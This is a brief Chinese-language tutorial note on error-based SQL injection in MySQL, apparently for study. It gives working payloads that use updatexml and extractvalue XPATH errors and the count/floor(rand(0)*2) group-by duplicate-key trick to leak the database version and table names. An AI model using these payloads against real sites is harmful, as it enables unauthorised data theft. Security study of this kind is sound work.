## 报错注入

[知识点](https://xz.aliyun.com/t/253)

* 数据溢出

* xpath语法错误

    ```
    mysql> select updatexml(1,concat(0x7e,(select @@version),0x7e),1);
    ERROR 1105 (HY000): XPATH syntax error: '~5.7.17~'
    mysql> select extractvalue(1,concat(0x7e,(select @@version),0x7e));
    ERROR 1105 (HY000): XPATH syntax error: '~5.7.17~'
    payload:
    id=1 and updatexml(1,concat(0x7e,(select @@version),0x7e),1)
    id=1 union select updatexml(1,concat(0x7e,(select @@version),0x7e),1) 
    ## 第二种有可能会 列数不匹配
    ```

* 主键重复， count(), group by 在遇到rand()产生的重复值报错
```mysql
1 Union select count(*),concat((查询语句),0x26,floor(rand(0)*2))x from information_schema.columns group by x;
```

有时候“查询语句”可能不让用union,也只能一行一行的显示，这时候需要用到limit命令，如下：

```mysql
concat((select table_name from information_schema.tables where table_schema='sqli' limit 1,1),0x26,floor(rand(0)*2))x
```

[limit用法](https://blog.csdn.net/sinat_36246371/article/details/54582904)

limit a,b  :  从第a个开始，显示b个（a从0开始数）

